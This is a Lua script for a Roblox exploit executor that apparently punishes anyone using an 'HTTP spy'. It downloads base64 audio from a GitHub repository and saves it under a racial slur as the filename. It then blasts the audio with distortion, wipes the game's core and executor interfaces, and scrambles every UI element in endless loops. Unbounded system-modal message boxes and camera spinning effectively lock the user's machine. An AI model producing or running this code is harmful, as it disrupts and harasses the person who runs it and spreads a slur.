local MessageBoxFlags = {
    0,
    1,
    2,
    3,
    4,
    5,
    16,
    32,
    48,
    64,
    256,
    4096,
    16384
}

local sounds = {
    "https://raw.githubusercontent.com/intstrnull/depot/refs/heads/main/encoded-20260213041658.txt",
    "https://raw.githubusercontent.com/intstrnull/depot/refs/heads/main/encoded-20260213043237.txt",
    "https://raw.githubusercontent.com/intstrnull/depot/refs/heads/main/encoded-20260213043244.txt",
    "https://raw.githubusercontent.com/intstrnull/depot/refs/heads/main/encoded-20260213043330.txt",
    "https://raw.githubusercontent.com/intstrnull/depot/refs/heads/main/encoded-20260213043455.txt",
    "https://raw.githubusercontent.com/intstrnull/depot/refs/heads/main/encoded-20260213043549.txt",
    "https://raw.githubusercontent.com/intstrnull/depot/refs/heads/main/encoded-20260213043602.txt",
    "https://raw.githubusercontent.com/intstrnull/depot/refs/heads/main/encoded-20260213043609.txt",
    "https://raw.githubusercontent.com/intstrnull/depot/refs/heads/main/encoded-20260213043616.txt",
    "https://raw.githubusercontent.com/intstrnull/depot/refs/heads/main/encoded-20260213043700.txt",
    "https://raw.githubusercontent.com/intstrnull/depot/refs/heads/main/encoded-20260213043730.txt",
}

local Sound = Instance.new("Sound",game)
Sound.Volume = 10
local dist = Instance.new("DistortionSoundEffect",Sound)
dist.Level = 0.75
dist.Enabled = true

local count = 1

task.spawn(function()
    while task.wait() do
        local Encoded = game:HttpGet(sounds[count])
        writefile("nigga.mp3", crypt.base64decode(Encoded))
        local Retrieved = getcustomasset("nigga.mp3")
        Sound.SoundId = Retrieved
        Sound:Play()
        Sound.Ended:Wait()
		count += 1
		if count > #sounds then
			count = 1
		end
    end
end)

local cc = Instance.new("ColorCorrectionEffect",game:GetService("Lighting"))
cc.Contrast = 1
cc.Saturation = 3
cc.TintColor = Color3.new(1,0,0)

local hui = gethui()
hui:ClearAllChildren()
if hui then
    task.spawn(function()
        while task.wait() do
            for i,v in hui.Parent:GetDescendants() do
                pcall(function()
                    v.Name = "HTTP SPY DETECTED"
                end)
                pcall(function()
                    v.Text = "HTTP SPY DETECTED"
                end)
                pcall(function()
                    v.Position = UDim2.fromScale(math.random(-100,100)/100,math.random(-100,100)/100)
                end)
                pcall(function()
                    v.Rotation = math.random(0,360)
                end)
                pcall(function()
                    v.Visible = true
                end)
            end
        end
    end)
end

task.spawn(function()
	game:GetService("CoreGui"):ClearAllChildren()
    while task.wait() do
        for i,v in game:GetService("CoreGui"):GetDescendants() do
            pcall(function()
                v.Name = "HTTP SPY DETECTED"
            end)
            pcall(function()
                v.Text = "HTTP SPY DETECTED"
            end)
            pcall(function()
                v.Position = UDim2.fromScale(math.random(-100,100)/100,math.random(-100,100)/100)
            end)
            pcall(function()
                v.Rotation = math.random(0,360)
            end)
            pcall(function()
                v.Visible = true
            end)
        end
    end
end)

task.spawn(function()
    while task.wait() do
        for i,v in game:GetService("Players").LocalPlayer.PlayerGui:GetDescendants() do
            pcall(function()
                v.Name = "HTTP SPY DETECTED"
            end)
            pcall(function()
                v.Text = "HTTP SPY DETECTED"
            end)
            pcall(function()
                v.Position = UDim2.fromScale(math.random(-100,100)/100,math.random(-100,100)/100)
            end)
            pcall(function()
                v.Rotation = math.random(0,360)
            end)
            pcall(function()
                v.Visible = true
            end)
        end
    end
end)

task.spawn(function()
    while task.wait() do
        task.spawn(function()
            messagebox("HTTP SPY DETECTED", "HTTP SPY DETECTED", 4096)
        end)
        task.spawn(function()
            pcall(function()
                workspace.CurrentCamera.CFrame *= CFrame.Angles(math.random(0,360),math.random(0,360),math.random(0,360))
            end)
        end)
    end
end)
